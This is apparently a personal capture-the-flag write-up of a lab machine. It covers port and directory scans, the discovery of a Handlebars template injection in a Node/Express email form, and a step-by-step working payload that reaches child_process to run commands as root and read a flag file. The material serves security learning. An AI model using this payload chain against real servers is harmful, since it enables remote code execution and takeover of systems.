---- 
## Initial Information

- Attacker IP = 10.10.14.136
- Victim IP = 10.129.176.129
---
## Initial Recon 
- Did the initial scan and found that port 22 and 80 are open meaning that there is **ssh access** and an **express http server** running based on the results. this is also a **Ubuntu server** as the version of ssh shows unbuntu in the results
```shell
nmap -sV 10.129.176.129

Nmap scan report for 10.129.176.129

Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- did a gobuster scan in order to see any hidden directires, didn't find anything 
```shell

gobuster dir -u 10.129.97.64 -w /usr/share/wordlists
========================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@fire
========================================================
[+] Url:                     http://10.129.97.64
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/c
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
========================================================
2023/03/26 09:42:23 Starting gobuster in directory enume
========================================================
/css                  (Status: 301) [Size: 173] [--> /cs
/images               (Status: 301) [Size: 179] [--> /im
/js                   (Status: 301) [Size: 171] [--> /js
Progress: 4602 / 4615 (99.72%)
========================================================
2023/03/26 09:42:40 Finished


```
- visted the home page of the express server with the victim IP found the following page.
![[Pasted image 20230325143531.png]]
- Enumerated some urls such as register, login and admin. there are no hidden URLS
- Tested for server side template injection, got the following error when testing with {{7`*`7}} got the following error
```json
	"Error: Parse error on line 1:"
1	" {{7*7}}"
2	"---^"
3	"Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'"
4	"    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)"
5	"    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)"
6	"    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)"
7	"    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)"
8	"    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)"
9	"    at router.post (/root/Backend/routes/handlers.js:15:18)"
10	"    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
11	"    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)"
12	"    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)"
13	"    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
```

In burp suite enable the Interpreter and pass payloads.
the test payload  that that was passed was {{7`*`7}} to test that we can inject handle bars code .  This is proven to be true.

We need to send the request to the Repeater and then add the payload via the decoder  user the encode as URL see the images below:
![[Pasted image 20230329150057.png]]
*Image above shows that the payload can be added to the request and the email parameter where the payload needs to be to passed to*

![[Pasted image 20230329150028.png]]
*Image above shows that the payload that will be created that we can then add to the repeater*
- This is payload used
```shell
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
- Having added the payload we get the following error and sent it back to the repeater we get the following error becasue require is not a global variable. in order the the code to work we need to use global variables
```shell
["ReferenceError: require is not defined","    at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)","    at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)","    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:5:37)","    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)","    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)","    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)","    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)","    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)","    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)","    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)"]
```

- in order to stop getting the error the following code needs to be decoded and sent to the repeater
```shell
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- After correcting the payload we no longer get and errors and can sse that the payload expects a process 
```html 

HTTP/1.1 200 OK

X-Powered-By: Express

Content-Type: text/html; charset=utf-8

Content-Length: 1237

ETag: W/"4d5-twHNJDnkmF/i2zkQyUWyNUdvbIQ"

Date: Wed, 29 Mar 2023 14:26:03 GMT

Connection: close



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/home.css">
    <title> Bike </title>
</head>
<header>

</header>

<body>
    <div id=container>
  <img
    src="images/buttons.gif"
    id="avatar">
  <div class="type-wrap">
    <span id="typed" style="white-space:pre;" class="typed"></span>
  </div>
</div>
<div id="contact">
    <h3>We can let you know once we are up and running.</h3>
    <div class="fields">
      <form id="form" method="POST" action="/">
        <input name="email" placeholder="E-mail"></input>
        <button type="submit" class="button-54" name="action" value="Submit">Submit</button>
      </form>
    </div>
    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            [object process]

    </p>
</div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="js/typed.min.js"></script>
    <script src="js/main.js"></script>
</body>

</html>
```

- having changed the module to use process.mainModule we can see that the require is now being we can now call the require and we show no errors
![[Pasted image 20230329154315.png]]
```shell
{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- Then by adding the execSync with whoami in order to find who is currently logged in
```shell
{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
- Runnig the code give the user name root this gives us a username to access via SSH with password cracking
```
  We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            root

```

- Searching ls /root -ll will show where the flag is located 
```shell
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            total 12
drwxrwxr-x 6 root root 4096 Feb 28  2022 Backend
-r-------- 1 root root   33 Feb 10  2022 flag.txt
drwxr-xr-x 3 root root 4096 Feb 28  2022 snap

```
- By using the cat /root/flag.txt we get the flag
```shell
6b258d726d287462d60c103d0142a81c
```

----
### Resources

- Server side template injection -  https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- Required is not a vairable https://nodejs.org/api/globals.html
- Main Process to stest can we pull require into the script: https://nodejs.org/api/process.html
- Documentation for child processes: https://nodejs.org/api/child_process.html
- Child processes but gives the finer details
- Exec Sync to run our own code before the server code: https://nodejs.org/api/child_process.html#child_processexecsynccommand-options